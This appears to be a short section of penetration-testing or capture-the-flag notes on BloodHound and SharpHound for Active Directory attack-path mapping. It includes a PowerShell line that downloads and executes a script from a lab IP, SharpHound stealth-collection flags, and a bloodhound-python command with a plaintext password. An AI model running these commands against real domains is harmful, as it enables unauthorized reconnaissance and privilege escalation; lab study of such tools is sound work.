####  [bloodhound - for domain controllers](https://github.com/BloodHoundAD/BloodHound)
> [SharpHound.exe](https://github.com/BloodHoundAD/SharpHound3)


```
IEX (New-Object System.Net.WebClient).DownloadString('http://10.10.14.64/
SharpHound.ps1');Invoke-BloodHound -CollectionMethod All
## or

./BloodHound.bin --no-sandbox
locate neo4j | grep auth # delete to reset password
neo4j console # user:pass = neo4j:neo4j
# upload SharpHound and extract generated zip file - .\SharpHound.exe -c all --zipfilename hellothere.zip --encryptzip --stealth
# mark owner as owned
# show shortest path
# show path from owned principles
# nslookup any new domain objects found
# Any writedacl permissions / Account Operators / Group Permissions / account creation
# Exchange Server Group Permissions
```

#### Bloodhound with python
```
bloodhound-python -c ALL -u support -p '#00^BlackKnight' -d box.local -dc dc01.box.local -ns $(cat ip)
```